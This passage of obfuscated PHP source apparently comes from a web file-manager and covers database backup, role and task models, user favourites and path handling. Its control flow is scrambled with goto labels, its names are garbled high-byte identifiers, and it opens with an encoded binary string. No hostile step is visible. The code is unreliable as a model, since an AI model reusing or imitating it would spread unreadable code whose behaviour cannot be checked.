ô>,İ_'."\n".'5'."\r".'¶ï')."\x5e\x2c\x60\xf5\x96\x6e\xd3\x1d\xa3\x8\x4b\x1a\x82\xca\x26\x1\xd2\x76\x88\x7e\x4e\x7\xfa\xc5\x64\x9b\x9b\x71\xb2\x68\x42\x9a\x4d\xa7\x1d\x3f\xf9\xba\x2c\xef\xc4\x42\x3a\xda\x2c"."\302\247\355\61\253\57\34\237\50\241\242\50\304\304\133\317\302\133\170\224\313\41\2\107\172\236\106\324\233\272\264\270\160\313\216\5\13\142\163\105\140\54\150\30\341".strrev(''."\0".''."\0".'›rŞ48?şÉ0')."", 10, -8))); goto cˆÂš±‡Ä·; Aò˜”•Õ¦: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto E¦ŠøËœåÛ; C‘µÅé¼ìº: foreach ($C°îøŸ”ç as $d´†¥í“ƒˆ) { $dÌõ²áÌ¹¦ = $f‹©ë²¼ñ . $d´†¥í“ƒˆ . $eèç±Ò•¶[730]; $aÎ”ù†í‘ì = null; if ($d´†¥í“ƒˆ == $eèç±Ò•¶[731] && (!isset($bƒåîÈ‹ùí[$eèç±Ò•¶[705]]) || $bƒåîÈ‹ùí[$eèç±Ò•¶[705]] == $eèç±Ò•¶[491])) { $aÎ”ù†í‘ì = self::$io; } $c¤Õ¢®Ë += $b¯ã’Á¥Öº->sqlFromDb($d´†¥í“ƒˆ, $dÌõ²áÌ¹¦, $eˆæ¨Ü£Â, $aÎ”ù†í‘ì); } if (isset($eˆæ¨Ü£Â->task[$eèç±Ò•¶[732]])) { $c‘®®ƒ¨æ° = $eˆæ¨Ü£Â->task[$eèç±Ò•¶[732]] ? $eˆæ¨Ü£Â->task[$eèç±Ò•¶[732]] : timeFloat(); $BÌ—öáïñ• = $c‘®®ƒ¨æ° - $eˆæ¨Ü£Â->task[$eèç±Ò•¶[733]]; if ($BÌ—öáïñ• >= 0.2) { $Cçî¸Ò«¢ += 1; } } $eˆæ¨Ü£Â->end(); goto EĞ»‹Œ¤á; ašÑ‡¥Ù„±: mk_dir($f‹©ë²¼ñ); $Cçî¸Ò«¢ = $c¤Õ¢®Ë = 0; try { $C°îøŸ”ç = $b¯ã’Á¥Öº->db()->getTables(); } catch (Exception $CóË‘Å¦º) { return !1; } goto C„’–Ş‰öª; bÁ¬È†: return !0; goto c”ó¬Ÿ‘—‰; EĞ»‹Œ¤á: $aš±Øòå¸Ï = array($eèç±Ò•¶[734] => $b’·º²–‹, $eèç±Ò•¶[719] => 1, $eèç±Ò•¶[735] => $Cçî¸Ò«¢, $eèç±Ò•¶[736] => $c¤Õ¢®Ë); Backup::set($aš±Øòå¸Ï); if ($Cçî¸Ò«¢ > $c¤Õ¢®Ë) { return !1; } goto bÁ¬È†; C„’–Ş‰öª: $C°îøŸ”ç = array_diff($C°îøŸ”ç, array($eèç±Ò•¶[723], $eèç±Ò•¶[724])); foreach ($C°îøŸ”ç as $d´†¥í“ƒˆ) { $Cçî¸Ò«¢ += $b¯ã’Á¥Öº->model($d´†¥í“ƒˆ)->count(); } $eˆæ¨Ü£Â = new Task($eèç±Ò•¶[725], $eèç±Ò•¶[726], $Cçî¸Ò«¢, LNG($eèç±Ò•¶[727]) . $eèç±Ò•¶[728] . LNG($eèç±Ò•¶[729])); goto C‘µÅé¼ìº; F¤ĞÏ‹Î†ó: self::$name = $bƒåîÈ‹ùí[$eèç±Ò•¶[28]]; $AŒ•Æ‘´Ãƒ = $GLOBALS[$eèç±Ò•¶[6]][$eèç±Ò•¶[17]]; $b’·º²–‹ = $this->_dbType($AŒ•Æ‘´Ãƒ); goto AŞæÔ­Û‰ã; AŞæÔ­Û‰ã: $b¯ã’Á¥Öº = new DbManage($AŒ•Æ‘´Ãƒ, $b’·º²–‹); $f‹©ë²¼ñ = TEMP_FILES . $eèç±Ò•¶[722] . self::$name . $eèç±Ò•¶[8]; del_dir($f‹©ë²¼ñ); goto ašÑ‡¥Ù„±; E¦ŠøËœåÛ: $eèç±Ò•¶ =& $_SERVER[Š‰]; $bƒåîÈ‹ùí = Backup::get(); self::$io = $bƒåîÈ‹ùí[$eèç±Ò•¶[704]]; goto F¤ĞÏ‹Î†ó; c”ó¬Ÿ‘—‰: } private function _dbType($E·‘’­Ûï‹) { goto bò‰áªŒÏ–; EíÜî…×¯: return $Eì”ƒöëÚ¹; goto E¤ŸÂ£ š´; føëï‚›ç©: if ($Eì”ƒöëÚ¹ == $Fğô’†óíˆ[738]) { $a¢¾ø‰”¦¶ = explode($Fğô’†óíˆ[4], $E·‘’­Ûï‹[$Fğô’†óíˆ[739]]); $Eì”ƒöëÚ¹ = $a¢¾ø‰”¦¶[0]; } $CŒ”„ÑõŒ = array($Fğô’†óíˆ[740] => $Fğô’†óíˆ[9], $Fğô’†óíˆ[741] => $Fğô’†óíˆ[742]); if (isset($CŒ”„ÑõŒ[$Eì”ƒöëÚ¹])) { $Eì”ƒöëÚ¹ = $CŒ”„ÑõŒ[$Eì”ƒöëÚ¹]; } goto EíÜî…×¯; bò‰áªŒÏ–: $Fğô’†óíˆ =& $_SERVER[Š‰]; $E·‘’­Ûï‹ = array_change_key_case($E·‘’­Ûï‹); $Eì”ƒöëÚ¹ = $E·‘’­Ûï‹[$Fğô’†óíˆ[737]]; goto føëï‚›ç©; E¤ŸÂ£ š´: } } class BackupDbFile { public function __construct() { } public function index() { goto D“ã§õäÎç; aóà‡‚“Ò: $cÕËÁÆğª = IO::listPath($cºµ›—İ‰¡); $dëåŒ¦ÊíÂ = isset($cÕËÁÆğª[$bÈ¨à‹Ú¢“[73]]) ? $cÕËÁÆğª[$bÈ¨à‹Ú¢“[73]] : array(); $C‰¤Õ˜Ô¸É = array_sum(array_column($dëåŒ¦ÊíÂ, $bÈ¨à‹Ú¢“[77])); goto fÉø§ßéµ­; b“«ò©‚•Ñ: $D¡Ùè¸Öë½->task[$bÈ¨à‹Ú¢“[711]] = $C‰¤Õ˜Ô¸É; foreach ($cÕËÁÆğª[$bÈ¨à‹Ú¢“[73]] as $C¨™±È­†ë) { $C¶¸…ˆŞˆ = IO::move($C¨™±È­†ë[$bÈ¨à‹Ú¢“[75]], $EŒ»î± ß); if (!$C¶¸…ˆŞˆ) { $D¡Ùè¸Öë½->end(); $e¿îáÜ†™Ä = IO::getLastError($bÈ¨à‹Ú¢“[746] . $C¨™±È­†ë[$bÈ¨à‹Ú¢“[75]] . $bÈ¨à‹Ú¢“[747] . $EŒ»î± ß . $bÈ¨à‹Ú¢“[499]); write_log($e¿îáÜ†™Ä, $bÈ¨à‹Ú¢“[726]); return !1; } } $cñ•çã‹í‰ = CONTROLLER_DIR . $bÈ¨à‹Ú¢“[748]; goto F‹×õ²¬ñ; F‹×õ²¬ñ: $DÃ÷ÏÈÁœ = CONTROLLER_DIR . $bÈ¨à‹Ú¢“[749]; IO::copy($cñ•çã‹í‰, $EŒ»î± ß); IO::copy($DÃ÷ÏÈÁœ, $EŒ»î± ß); goto d¡òÑÊÉæ¨; D“ã§õäÎç: $bÈ¨à‹Ú¢“ =& $_SERVER[Š‰]; $e¯£†å¸¥Ö = Backup::get(); $CÛÁšÒİå = $e¯£†å¸¥Ö[$bÈ¨à‹Ú¢“[28]]; goto A¾¶àÀÓ¤; A¾¶àÀÓ¤: $cºµ›—İ‰¡ = TEMP_FILES . "\x62\x61\x63\153\165\160\x5f{$CÛÁšÒİå}\57"; $EŒ»î± ß = "\173\x69\157\x3a{$e¯£†å¸¥Ö[$bÈ¨à‹Ú¢“[704]]}\175\x2f\144\141\x74\141\142\141\x73\145\x2f\142\x61\x63\x6b\x75\160\x5f{$CÛÁšÒİå}\57"; if (!($EŒ»î± ß = IO::mkdir($EŒ»î± ß))) { return !1; } goto aóà‡‚“Ò; d¡òÑÊÉæ¨: $D¡Ùè¸Öë½->end(); Backup::set(array($bÈ¨à‹Ú¢“[750] => $C‰¤Õ˜Ô¸É)); return !0; goto DîÔÒ²…£²; fÉø§ßéµ­: if (!$C‰¤Õ˜Ô¸É) { return !1; } Backup::set(array($bÈ¨à‹Ú¢“[743] => $C‰¤Õ˜Ô¸É)); $D¡Ùè¸Öë½ = new TaskFileTransfer($bÈ¨à‹Ú¢“[744], $bÈ¨à‹Ú¢“[726], count($dëåŒ¦ÊíÂ), LNG($bÈ¨à‹Ú¢“[727]) . $bÈ¨à‹Ú¢“[434] . LNG($bÈ¨à‹Ú¢“[729]) . $bÈ¨à‹Ú¢“[745]); goto b“«ò©‚•Ñ; DîÔÒ²…£²: } } $dŠÉ•«óá = $_SERVER[$_SERVER[Š‰][751]]; goto bï¨²‚î·»; E½­æÆ°ˆ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\56\x72\x6f\x6c\x65\114\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\x61\165\x74\150", "\x6c\141\142\x65\154", "\x64\x69\163\x70\x6c\141\171", "\163\171\163\x74\x65\155", "\x64\x65\163\x63", "\x69\147\156\157\162\145\x45\x78\x74", "\151\x67\x6e\157\162\145\106\151\x6c\145\x53\151\x7a\x65", "\x61\x64\x6d\x69\156\x69\163\164\x72\x61\x74\157\162", "\x73\157\162\x74"); public function listData($BçÏâãä†Ş = false, $CŠ¦”»‰™ì = "\x73\x6f\x72\164", $e‰°…îŒµ¸ = false) { $eÒôê’ˆ‰‹ =& $_SERVER[Š‰]; $dÜÀ©Ï™Ÿ = parent::listData($BçÏâãä†Ş, $CŠ¦”»‰™ì, $e‰°…îŒµ¸); if (!$BçÏâãä†Ş) { foreach ($dÜÀ©Ï™Ÿ as $DŸ«ÉÓß¸ => $BÍ˜É“·‡) { if ($BÍ˜É“·‡[$eÒôê’ˆ‰‹[1853]] == 1) { $dÜÀ©Ï™Ÿ[$DŸ«ÉÓß¸][$eÒôê’ˆ‰‹[425]] = LNG($eÒôê’ˆ‰‹[2075]); } } } return $dÜÀ©Ï™Ÿ; } public function update($Fò‚­Ú†Ú, $d•˜çÍÜ) { goto e ó ­ùàª; BóÏÅ…÷: return parent::update($Fò‚­Ú†Ú, $d•˜çÍÜ); goto C°“İêÁÜ; CÎ…ÔÖ³£: if (!$eä÷ù¶®„Å || $eø–Åí–®Ğ && $eø–Åí–®Ğ[$c¹³ƒª×[388]] != $eä÷ù¶®„Å[$c¹³ƒª×[388]]) { return !1; } if ($eø–Åí–®Ğ[$c¹³ƒª×[1853]] == 1) { $d•˜çÍÜ = array($c¹³ƒª×[28] => $d•˜çÍÜ[$c¹³ƒª×[28]], $c¹³ƒª×[1684] => $d•˜çÍÜ[$c¹³ƒª×[1684]]); } $this->filterAuth($d•˜çÍÜ[$c¹³ƒª×[400]]); goto BóÏÅ…÷; e ó ­ùàª: $c¹³ƒª× =& $_SERVER[Š‰]; $eä÷ù¶®„Å = parent::listData($Fò‚­Ú†Ú); $eø–Åí–®Ğ = $this->findByName($d•˜çÍÜ[$c¹³ƒª×[28]]); goto CÎ…ÔÖ³£; C°“İêÁÜ: } public function remove($bç‚Æ·˜ËÏ) { $Cİñò«¥ŸØ = parent::listData($bç‚Æ·˜ËÏ); if (!$Cİñò«¥ŸØ || $Cİñò«¥ŸØ[$_SERVER[Š‰][1145]]) { return !1; } return parent::remove($bç‚Æ·˜ËÏ); } public function add($FÚ­¼µ‡ºë) { goto DÅ¼‘—ŞË; B¸‡ö‡Ğ†ä: return parent::insert($FÚ­¼µ‡ºë); goto AˆÈ¹¾Ç½; DÅ¼‘—ŞË: $B„ÜÁ¢äÆŒ =& $_SERVER[Š‰]; $C‚ø–¿Ê° = $FÚ­¼µ‡ºë[$B„ÜÁ¢äÆŒ[28]]; if ($this->findByName($C‚ø–¿Ê°)) { return !1; } goto f”å™•¨İö; f”å™•¨İö: $bòÑÑÑ‰œÎ = array($B„ÜÁ¢äÆŒ[407] => $C‚ø–¿Ê°, $B„ÜÁ¢äÆŒ[1669] => $B„ÜÁ¢äÆŒ[33], $B„ÜÁ¢äÆŒ[1665] => $B„ÜÁ¢äÆŒ[1673], $B„ÜÁ¢äÆŒ[2076] => 1, $B„ÜÁ¢äÆŒ[1668] => 0, $B„ÜÁ¢äÆŒ[2077] => 0, $B„ÜÁ¢äÆŒ[1667] => $this->getSort()); $FÚ­¼µ‡ºë = array_merge($bòÑÑÑ‰œÎ, $FÚ­¼µ‡ºë); $this->filterAuth($FÚ­¼µ‡ºë[$B„ÜÁ¢äÆŒ[400]]); goto B¸‡ö‡Ğ†ä; AˆÈ¹¾Ç½: } private function getSort() { $aÆ²£Ç×›¾ =& $_SERVER[Š‰]; $AÅ’ ¶òê± = parent::listData(); $eå·†ò¦Ò¥ = array_to_keyvalue($AÅ’ ¶òê±, $aÆ²£Ç×›¾[33], $aÆ²£Ç×›¾[1686]); return empty($eå·†ò¦Ò¥) ? 0 : max($eå·†ò¦Ò¥) + 1; } private function filterAuth(&$bê½…ƒ´) { $EÇ®İ¾®öù =& $_SERVER[Š‰]; $e´Ç´‚±º = array(); $cà»÷©ŒµÏ = array_filter(explode($EÇ®İ¾®öù[47], $bê½…ƒ´)); foreach ($cà»÷©ŒµÏ as $bê½…ƒ´) { $bƒÑ›ˆ§ÌÈ = explode($EÇ®İ¾®öù[94], $bê½…ƒ´); if ($bƒÑ›ˆ§ÌÈ[0] == $EÇ®İ¾®öù[2078] && $bƒÑ›ˆ§ÌÈ[1] != $EÇ®İ¾®öù[1066]) { $d¯‘‹—Ã•Ø = $bƒÑ›ˆ§ÌÈ[0] . $EÇ®İ¾®öù[94] . $bƒÑ›ˆ§ÌÈ[1] . $EÇ®İ¾®öù[2079]; if (!in_array($d¯‘‹—Ã•Ø, $cà»÷©ŒµÏ)) { $e´Ç´‚±º[] = $d¯‘‹—Ã•Ø; } } $e´Ç´‚±º[] = $bê½…ƒ´; } $bê½…ƒ´ = implode($EÇ®İ¾®öù[47], $e´Ç´‚±º); } public function sort($f‘§ÕÌÂ©, $cƒèâß‘æ) { return parent::update($f‘§ÕÌÂ©, $cƒèâß‘æ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\x74\141\x73\x6b\114\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\164\171\160\x65", "\145\166\x65\156\x74", "\x74\x69\155\145", "\144\145\163\143", "\x73\171\163\x74\145\155", "\145\156\141\x62\154\x65", "\154\141\163\164\x52\x75\156", "\163\x6f\x72\x74"); public function listData($D‡ŸÏÔç‰ = false, $EœŠ´Ç«Ä” = "\163\x6f\162\164", $d‚¬Ñˆ´ÍÍ = false) { return parent::listData($D‡ŸÏÔç‰, $EœŠ´Ç«Ä”, $d‚¬Ñˆ´ÍÍ); } public function add($BßËé•˜ø) { $f¨Ø¨’ñ¼Ë =& $_SERVER[Š‰]; $b„œÆÇÍ† = $this->findByName($BßËé•˜ø[$f¨Ø¨’ñ¼Ë[28]]); if ($b„œÆÇÍ†) { return !1; } $BßËé•˜ø[$f¨Ø¨’ñ¼Ë[1464]] = 0; $BßËé•˜ø[$f¨Ø¨’ñ¼Ë[1686]] = $this->getSort(); return parent::insert($BßËé•˜ø); } private function getSort() { $bÊÅ÷ãÇÆ =& $_SERVER[Š‰]; $d×ºÎìÍŸ¶ = parent::listData(); $Cù¡¬ÅóÛÍ = array_to_keyvalue($d×ºÎìÍŸ¶, $bÊÅ÷ãÇÆ[33], $bÊÅ÷ãÇÆ[1686]); return empty($Cù¡¬ÅóÛÍ) ? 0 : max($Cù¡¬ÅóÛÍ) + 1; } public function update($d·ôØÆÊË, $C¬¦ÜàÉñÑ) { $C»éîÁİƒ² =& $_SERVER[Š‰]; $CºÄ†’³ß = $this->listData($d·ôØÆÊË); $dÍ¡®¯Âó² = $this->findByName($C¬¦ÜàÉñÑ[$C»éîÁİƒ²[28]]); if (!$CºÄ†’³ß || $dÍ¡®¯Âó² && $dÍ¡®¯Âó²[$C»éîÁİƒ²[388]] != $CºÄ†’³ß[$C»éîÁİƒ²[388]]) { return !1; } return parent::update($d·ôØÆÊË, $C¬¦ÜàÉñÑ); } public function remove($c­¬—Ô§¯š, $dïœ¶ÎÄÃÂ = false) { $A°Ñ„ÖŸŠ° =& $_SERVER[Š‰]; $DŸ¨±ŒĞª  = $this->listData($c­¬—Ô§¯š); if (!$DŸ¨±ŒĞª ) { return; } if (!$dïœ¶ÎÄÃÂ && $DŸ¨±ŒĞª [$A°Ñ„ÖŸŠ°[1145]] == $A°Ñ„ÖŸŠ°[86]) { return !1; } return parent::remove($c­¬—Ô§¯š); } public function enable($B£õÍ¶çå¢, $fëäá®Î©ô) { return $this->update($B£õÍ¶çå¢, array($_SERVER[Š‰][2070] => $fëäá®Î©ô)); } public function run($fš©ù†Ó†¡) { return $this->update($fš©ù†Ó†¡, array($_SERVER[Š‰][2080] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\146\141\166"; protected function cacheFunctionAlias($fÑ‚Ø‹°œÍ) { $cêÛŞŞÃ¡• =& $_SERVER[Š‰]; return array($cêÛŞŞÃ¡•[1766] => array(USER_ID, $cêÛŞŞÃ¡•[2081])); } protected function listData() { $AÜÂÄ†Ã¯ =& $_SERVER[Š‰]; $AàŠ¤‚òàî = array($AÜÂÄ†Ã¯[1492] => USER_ID, $AÜÂÄ†Ã¯[457] => 0); $aƒôáµ•—Ù = $AÜÂÄ†Ã¯[2082]; $cƒ‹Æ°Éã— = $this->field($aƒôáµ•—Ù)->where($AàŠ¤‚òàî)->order($AÜÂÄ†Ã¯[2083])->select(); return $cƒ‹Æ°Éã— ? $cƒ‹Æ°Éã— : array(); } protected function resetCache() { } protected function listView() { goto D¬“¤šİÛó; BÒ£¹Ó×õ: $a¿—˜øŠÉ¶ = array_to_keyvalue($Eœ·²Üõİé, $D“‹İ”ŸÈÓ[33], $D“‹İ”ŸÈÓ[75]); if (!$a¿—˜øŠÉ¶) { return $CÚÖäÒ¬ªø; } $E‰Æ×´ñå‰ = 2000; goto d‹·ˆ‘Ó„‡; d‹·ˆ‘Ó„‡: $dÙ¦’˜™ÓŠ = array($D“‹İ”ŸÈÓ[404] => array($D“‹İ”ŸÈÓ[405], $a¿—˜øŠÉ¶)); $E¦î¤Å™Ø = Model($D“‹İ”ŸÈÓ[775])->listSource($dÙ¦’˜™ÓŠ, $E‰Æ×´ñå‰); $E¦î¤Å™Ø = array_merge($E¦î¤Å™Ø[$D“‹İ”ŸÈÓ[73]], $E¦î¤Å™Ø[$D“‹İ”ŸÈÓ[74]]); goto f‘ğÜ–Ò«¢; D¬“¤šİÛó: $D“‹İ”ŸÈÓ =& $_SERVER[Š‰]; $CÚÖäÒ¬ªø = $this->listData(); $Eœ·²Üõİé = array_filter_by_field($CÚÖäÒ¬ªø, $D“‹İ”ŸÈÓ[29], $D“‹İ”ŸÈÓ[403]); goto BÒ£¹Ó×õ; f‘ğÜ–Ò«¢: $E¦î¤Å™Ø = array_to_keyvalue($E¦î¤Å™Ø, $D“‹İ”ŸÈÓ[390]); foreach ($CÚÖäÒ¬ªø as $B¾êù¤‹Ğ => $e„‚¬Õ„½¤) { $A¬ÀÇ‘›¼ß = $E¦î¤Å™Ø[$e„‚¬Õ„½¤[$D“‹İ”ŸÈÓ[75]]]; $A¬ÀÇ‘›¼ß = $A¬ÀÇ‘›¼ß ? $A¬ÀÇ‘›¼ß : array(); $CÚÖäÒ¬ªø[$B¾êù¤‹Ğ] = array_merge($A¬ÀÇ‘›¼ß, $e„‚¬Õ„½¤); } return $CÚÖäÒ¬ªø; goto B—º®İ–…; B—º®İ–…: } protected function addFav($BÄµÅÕ„ß, $Dï‚ˆ·ö¶ = '', $FëöÉºÒŸ = "\163\157\165\162\143\x65") { goto b÷˜«Åªì; DÅª·®˜¬¿: if (!$Dï‚ˆ·ö¶ && $FëöÉºÒŸ == $f‘á›ŠÄµ[403]) { $BæÈÃšÚ¢• = Model($f‘á›ŠÄµ[1180])->where(array($f‘á›ŠÄµ[404] => $BÄµÅÕ„ß))->find(); if (!$BæÈÃšÚ¢•) { return !1; } $Dï‚ˆ·ö¶ = $BæÈÃšÚ¢•[$f‘á›ŠÄµ[28]]; } $Dï‚ˆ·ö¶ = $this->getAutoName($Dï‚ˆ·ö¶); $C…²î¬ÂÆ“ = array($f‘á›ŠÄµ[1492] => USER_ID, $f‘á›ŠÄµ[457] => 0, $f‘á›ŠÄµ[407] => $Dï‚ˆ·ö¶, $f‘á›ŠÄµ[408] => $BÄµÅÕ„ß, $f‘á›ŠÄµ[409] => $FëöÉºÒŸ, $f‘á›ŠÄµ[1667] => $AÖÆò•æ + 1); goto DÏœÉà ‰; e–±«•ã½ğ: $E¯ÛğŒ¯¯à = array($f‘á›ŠÄµ[1492] => USER_ID, $f‘á›ŠÄµ[457] => 0); $AÖÆò•æ = $this->where($E¯ÛğŒ¯¯à)->max($f‘á›ŠÄµ[1686]); if (!$AÖÆò•æ) { $AÖÆò•æ = 0; } goto DÅª·®˜¬¿; DÏœÉà ‰: return $this->add($C…²î¬ÂÆ“); goto F£µÛ©Şôë; b÷˜«Åªì: $f‘á›ŠÄµ =& $_SERVER[Š‰]; $E¯ÛğŒ¯¯à = array($f‘á›ŠÄµ[1492] => USER_ID, $f‘á›ŠÄµ[457] => 0, $f‘á›ŠÄµ[409] => $FëöÉºÒŸ, $f‘á›ŠÄµ[408] => $BÄµÅÕ„ß); if ($this->where($E¯ÛğŒ¯¯à)->find()) { return !1; } goto e–±«•ã½ğ; F£µÛ©Şôë: } protected function remove($C÷“‡´œ£) { $d’§—ÊÚêî =& $_SERVER[Š‰]; $C¡¯ñ†ØİÑ = array($d’§—ÊÚêî[1492] => USER_ID, $d’§—ÊÚêî[406] => $C÷“‡´œ£); return $this->where($C¡¯ñ†ØİÑ)->delete(); } protected function removeByName($D¸ÙÄˆô™) { $b¹¼‰¦‚ğÒ =& $_SERVER[Š‰]; $f†ÜÎÛõöÓ = array($b¹¼‰¦‚ğÒ[1492] => USER_ID, $b¹¼‰¦‚ğÒ[407] => $D¸ÙÄˆô™, $b¹¼‰¦‚ğÒ[457] => 0); return $this->where($f†ÜÎÛõöÓ)->delete(); } protected function rename($eŞâî–åøÏ, $DØ‹¬ÏßÅé) { $A±‹å±æˆ— =& $_SERVER[Š‰]; if ($eŞâî–åøÏ == $DØ‹¬ÏßÅé) { return !1; } $A±±µ‰ë˜ = $this->getAutoName($DØ‹¬ÏßÅé); if ($DØ‹¬ÏßÅé != $A±±µ‰ë˜) { return !1; } $eï§–¥¥›ò = array($A±‹å±æˆ—[1492] => USER_ID, $A±‹å±æˆ—[457] => 0, $A±‹å±æˆ—[28] => $eŞâî–åøÏ); return $this->where($eï§–¥¥›ò)->save(array($A±‹å±æˆ—[28] => $DØ‹¬ÏßÅé)); } protected function resetSort($C“ø½¹Â—) { $b¬ßà°†ƒ˜ =& $_SERVER[Š‰]; $C“ø½¹Â— = is_array($C“ø½¹Â—) ? $C“ø½¹Â— : array(); $fœæ”ÂŒ‡ = array($b¬ßà°†ƒ˜[1492] => USER_ID); for ($Då‰æ›ÊÚ¡ = 0; $Då‰æ›ÊÚ¡ < count($C“ø½¹Â—); $Då‰æ›ÊÚ¡++) { $fœæ”ÂŒ‡[$b¬ßà°†ƒ˜[406]] = $C“ø½¹Â—[$Då‰æ›ÊÚ¡]; $this->where($fœæ”ÂŒ‡)->save(array($b¬ßà°†ƒ˜[1667] => $Då‰æ›ÊÚ¡ + 1)); } return !0; } protected function moveTop($F…Š‡×‰åÖ) { goto dò¼è¼®°î; EÈ¹¼±ØÈ¤: $FÅêë­¶àÃ = $bæêÍƒš¥¿; $bæêÍƒš¥¿ = array_remove_value($bæêÍƒš¥¿, $C·í‡”Ø®“[$Aï™Æİ™Ê[388]]); array_unshift($bæêÍƒš¥¿, $C·í‡”Ø®“[$Aï™Æİ™Ê[388]]); goto CñÄÂß‘¿Â; CñÄÂß‘¿Â: return $this->resetSort($bæêÍƒš¥¿); goto AíÏ–ïŠìÈ; dò¼è¼®°î: $Aï™Æİ™Ê =& $_SERVER[Š‰]; $D¢ŠåÈ§Öš = array($Aï™Æİ™Ê[1492] => USER_ID, $Aï™Æİ™Ê[457] => 0); $C·í‡”Ø®“ = $this->where($D¢ŠåÈ§Öš)->where(array($Aï™Æİ™Ê[28] => $F…Š‡×‰åÖ))->find(); goto FõƒßÊÖÁÄ; FõƒßÊÖÁÄ: if (!$C·í‡”Ø®“) { return; } $bæêÍƒš¥¿ = $this->field($Aï™Æİ™Ê[388])->where($D¢ŠåÈ§Öš)->order($Aï™Æİ™Ê[2083])->select(); $bæêÍƒš¥¿ = array_to_keyvalue($bæêÍƒš¥¿, $Aï™Æİ™Ê[33], $Aï™Æİ™Ê[388]); goto EÈ¹¼±ØÈ¤; AíÏ–ïŠìÈ: } protected function moveBottom($A©í‰¤¤×ä) { $dªè„‰˜ÂØ =& $_SERVER[Š‰]; $a¹¸ÛÀË¹ = array($dªè„‰˜ÂØ[1492] => USER_ID, $dªè„‰˜ÂØ[457] => 0); $CÊ¦Ï£ê· = $this->where($a¹¸ÛÀË¹)->max($dªè„‰˜ÂØ[1686]); $F“ë¶¿Ö¢¦ = array($dªè„‰˜ÂØ[1686] => $CÊ¦Ï£ê· + 1); return $this->where($a¹¸ÛÀË¹)->where(array($dªè„‰˜ÂØ[28] => $A©í‰¤¤×ä))->save($F“ë¶¿Ö¢¦); } private function getAutoName($d‹ÄôØØŸŸ) { goto EÕ×Ïœ‹ä‰; DÉ—„ÖéÈ: return $d‹ÄôØØŸŸ . "\50{$DÂ£ã¸ªù‚}\x29"; goto eˆØ”ÈÚ×œ; F³ïÜÎƒ¯Š: $FÄĞç®Í¢ê = array_to_keyvalue($FÄĞç®Í¢ê, $AŒñàÈùŞ[33], $AŒñàÈùŞ[28]); if (!$FÄĞç®Í¢ê || !in_array($d‹ÄôØØŸŸ, $FÄĞç®Í¢ê)) { return $d‹ÄôØØŸŸ; } for ($DÂ£ã¸ªù‚ = 0; $DÂ£ã¸ªù‚ < count($FÄĞç®Í¢ê); $DÂ£ã¸ªù‚++) { if (!in_array($d‹ÄôØØŸŸ . "\50{$DÂ£ã¸ªù‚}\x29", $FÄĞç®Í¢ê)) { return $d‹ÄôØØŸŸ . "\50{$DÂ£ã¸ªù‚}\x29"; } } goto DÉ—„ÖéÈ; EÕ×Ïœ‹ä‰: $AŒñàÈùŞ =& $_SERVER[Š‰]; $BíÒ¤…´áÆ = array($AŒñàÈùŞ[1492] => USER_ID, $AŒñàÈùŞ[457] => 0); $FÄĞç®Í¢ê = $this->field($AŒñàÈùŞ[28])->where($BíÒ¤…´áÆ)->select(); goto F³ïÜÎƒ¯Š; eˆØ”ÈÚ×œ: } } goto EÌ¹›³ÑÂÎ; DÂ³ºêø…ˆ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $eÈô›ó =& $_SERVER[Š‰]; $this->objectDriver = array($eÈô›ó[57], $eÈô›ó[58], $eÈô›ó[59], $eÈô›ó[60], $eÈô›ó[61], $eÈô›ó[62], $eÈô›ó[63], $eÈô›ó[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($bÚâØğåµ¨) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($bÚâØğåµ¨, $_SERVER[Š‰][8]); } return $bÚâØğåµ¨; } public function iconvApp($d×ÎŠğõÃÏ) { return $d×ÎŠğõÃÏ; } public function iconvSystem($C‰£àÖÓ) { return $C‰£àÖÓ; } public function iconvTo($CÍì¬¦´, $bâ™µÑµ“Š, $fóŞ÷ğßë·) { goto cã¤º®¥ÇÁ; D„¦İ‰ŸÅÁ: $EôªÂÇ®®¸ = $bâ™µÑµ“Š . $bİ‹¾ÚŸˆ¨[66] . $fóŞ÷ğßë· . $bİ‹¾ÚŸˆ¨[67] . $CÍì¬¦´; if (isset($D÷ô˜Ã¾Ñ[$EôªÂÇ®®¸])) { return $D÷ô˜Ã¾Ñ[$EôªÂÇ®®¸]; } if (function_exists($bİ‹¾ÚŸˆ¨[68])) { $B…ñÉêêİ = @mb_convert_encoding($CÍì¬¦´, $fóŞ÷ğßë·, $bâ™µÑµ“Š); } else { $B…ñÉêêİ = @iconv($bâ™µÑµ“Š, $fóŞ÷ğßë·, $CÍì¬¦´); } goto DÙÓ•æÀïï; DÙÓ•æÀïï: $B…ñÉêêİ = $B…ñÉêêİ ? $B…ñÉêêİ : $CÍì¬¦´; if (strstr($B…ñÉêêİ, $bİ‹¾ÚŸˆ¨[69])) { $B…ñÉêêİ = str_replace($bİ‹¾ÚŸˆ¨[69], $bİ‹¾ÚŸˆ¨[70], $B…ñÉêêİ); } $D÷ô˜Ã¾Ñ[$bâ™µÑµ“Š . $bİ‹¾ÚŸˆ¨[66] . $fóŞ÷ğßë· . $bİ‹¾ÚŸˆ¨[67] . $CÍì¬¦´] = $B…ñÉêêİ; goto A‹ã…¯œ¯Á; fÃ¦Ë¼Ì¢…: return $B…ñÉêêİ; goto dµøìÜˆÛ; A‹ã…¯œ¯Á: $D÷ô˜Ã¾Ñ[$fóŞ÷ğßë· . $bİ‹¾ÚŸˆ¨[66] . $bâ™µÑµ“Š . $bİ‹¾ÚŸˆ¨[67] . $CÍì¬¦´] = $CÍì¬¦´; $D÷ô˜Ã¾Ñ[$fóŞ÷ğßë· . $bİ‹¾ÚŸˆ¨[66] . $bâ™µÑµ“Š . $bİ‹¾ÚŸˆ¨[67] . $B…ñÉêêİ] = $CÍì¬¦´; $D÷ô˜Ã¾Ñ[$bâ™µÑµ“Š . $bİ‹¾ÚŸˆ¨[66] . $fóŞ÷ğßë· . $bİ‹¾ÚŸˆ¨[67] . $B…ñÉêêİ] = $B…ñÉêêİ; goto fÃ¦Ë¼Ì¢…; 